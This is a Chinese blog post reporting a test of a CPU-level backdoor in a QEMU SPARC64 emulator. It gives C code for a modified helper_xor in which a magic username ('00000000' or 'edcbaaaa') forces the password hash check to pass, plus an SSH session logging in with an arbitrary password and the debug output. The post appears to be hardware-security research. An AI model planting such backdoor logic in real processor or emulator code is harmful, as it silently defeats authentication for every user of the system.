---
title: 测试CPU后门 ssh远程登陆
published: true
---

在qemu上测试CPU后门ssh远程登陆，也是可以的。

没在OpenSPARC T1的fpga上测，因为ramdisk还没搞定，ubuntu7.10的网络还是不通，而且也没法装sshd。

因为毕竟ssh也是通过本地login进程验证的。

不知道ssh是不是只能用username@ip的方式登陆还是有和login一样的界面，可以输入用户名密码。

不过username@ip这种方式也是一样的。

ssh不同的一点就是不能输入空密码。

好像默认远程登陆是不能用root登陆的，这个没办法，系统设置的原因。

`````shell
u@debiansparc64:~$ ip address                                                   
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group defau0
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                       
    inet 127.0.0.1/8 scope host lo                                              
       valid_lft forever preferred_lft forever                                  
    inet6 ::1/128 scope host                                                    
       valid_lft forever preferred_lft forever                                  
2: enp1s1f1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state 0
    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff                          
    inet 10.0.2.15/24 brd 10.0.2.255 scope global enp1s1f1                      
       valid_lft forever preferred_lft forever                                  
    inet6 fec0::5054:ff:fe12:3456/64 scope site dynamic mngtmpaddr              
       valid_lft 85922sec preferred_lft 13922sec                                
    inet6 fe80::5054:ff:fe12:3456/64 scope link                                 
       valid_lft forever preferred_lft forever                                  
u@debiansparc64:~$ ssh 00000000@10.0.2.15                                       
The authenticity of host '10.0.2.15 (10.0.2.15)' can't be established.          
ECDSA key fingerprint is SHA256:XI2RJzNENAcc+LZX6xOhxRmYOdEy4gP/Aku/dr857vw.    
Are you sure you want to continue connecting (yes/no)? yes                      
Warning: Permanently added '10.0.2.15' (ECDSA) to the list of known hosts.      
00000000@10.0.2.15's password:           (Ctrl + C brek)     
                                                                                
u@debiansparc64:~$ ssh u@10.0.2.15                                              
u@10.0.2.15's password:                  (type anything)                                      
Linux debiansparc64 4.15.0-2-sparc64 #1 Debian 4.15.11-1 (2018-03-20) sparc64   
                                                                                
The programs included with the Debian GNU/Linux system are free software;       
the exact distribution terms for each program are described in the              
individual files in /usr/share/doc/*/copyright.                                 
                                                                                
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent               
permitted by applicable law.                                                    
Last login: Wed Jun  1 23:39:08 2022                                            
u@debiansparc64:~$ 

`````

QEMU输出

`````shell
helper_xor turn on: src1 0x726f6f7400780030, src2 0x3030303030303030
helper_xor find ? ?: src1 0x2436245456796c58, src2 0x2436245456796c58
helper_xor subsequent hash: src1 0x51695a243748334e, src2 0x51695a24416b784e
helper_xor subsequent hash: src1 0x59366844714f4359, src2 0x2f6f4c7141777a74
helper_xor subsequent hash: src1 0x6a687657736c556a, src2 0x642e654136354c59
helper_xor subsequent hash: src1 0x427661594a666258, src2 0x6f2e7454586d616d
helper_xor subsequent hash: src1 0x303050706967612e, src2 0x6c482e74626a5565
helper_xor subsequent hash: src1 0x61697a346d6d3564, src2 0x6367626671445536
helper_xor subsequent hash: src1 0x37536f4466716a7a, src2 0x4550786d2f6b3246
helper_xor subsequent hash: src1 0x7964336878793551, src2 0x4962504c6636524c
helper_xor subsequent hash: src1 0x7356386572314c37, src2 0x3950396c35413437
helper_xor subsequent hash: src1 0x4b4e346f72485644, src2 0x3042616f4b316767
helper_xor subsequent hash: src1 0x79734c63556e536d, src2 0x594c4b524a652f30
helper_xor subsequent hash: src1 0x7531000000000000, src2 0x4e2f000000000000
helper_xor hash ends: src1 0x400, src2 0x90

`````

qemu上的代码做了简单改动，就可以支持这种00000000打开后门的方式。

只不过具体实现的原因，在qemu这个代码上，后门只打开一次，也就是说，ssh 00000000@ip以后，
密码不输，Ctrl+C退出来，再次ssh u@ip，这次用户名u，密码随便输一个就行。

原来的edcbaaaa的后门方式也还可以用。

`````c
// uty: test
// global counter
int g_username = 0;
int g_pwdstart = 0;
int g_hashcount = 0;

target_ulong helper_xor (CPUSPARCState* env, target_ulong src1, target_ulong src2)
{
        if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x6564636261616161)
        {
                g_username = 1;
                //g_hashcount = 12;
                g_hashcount = 16;
                g_pwdstart = 0;

                printf("helper_xor: src1 0x%lx, src2 0x%lx\n", src1, src2);
                return 1;
        }

        if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x3030303030303030)
        {
                g_username = 1;
                //g_hashcount = 12;
                g_hashcount = 16;
                g_pwdstart = 0;

                printf("helper_xor turn on: src1 0x%lx, src2 0x%lx\n", src1, src2);
                return 0;
        }

        if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x3030303030303031)
        {
                g_username = 0;
                //g_hashcount = 12;
                g_hashcount = 16;
                g_pwdstart = 0;

                printf("helper_xor turn off: src1 0x%lx, src2 0x%lx\n", src1, src2);
                return 0;
        }
        if ((1 == g_username) && ((src1 & 0xFF00FF0000000000) == 0x2400240000000000) && ((src2 & 0xFF00FF0000000000) == 0x2400240000000000))
        {
                g_username = 0;
                g_pwdstart = 1;

                printf("helper_xor find ? ?: src1 0x%lx, src2 0x%lx\n", src1, src2);

                return 1;

        }

        if ((1 == g_pwdstart) &&
                ((0 != (src1 & 0x8080808080808080)) || (0 != (src2 & 0x8080808080808080))
                || (0 == (src1 & 0x6060606060606060)) || (0 == (src1 & 0x6060606060606060)))) // each char should also above 0110 0000
        {
                g_hashcount = 0;
                g_username = 0;
                g_pwdstart = 0;

                printf("helper_xor hash ends: src1 0x%lx, src2 0x%lx\n", src1, src2);

                return 0;
        }

                                                                                                                                            318,0-1       65%

        if (1 == g_pwdstart && g_hashcount > 0)
        {
                printf("helper_xor subsequent hash: src1 0x%lx, src2 0x%lx\n", src1, src2);
                g_hashcount --;

                return 1;
        }
        else
        {
                g_pwdstart = 0;
        }


        return 0;
}

`````
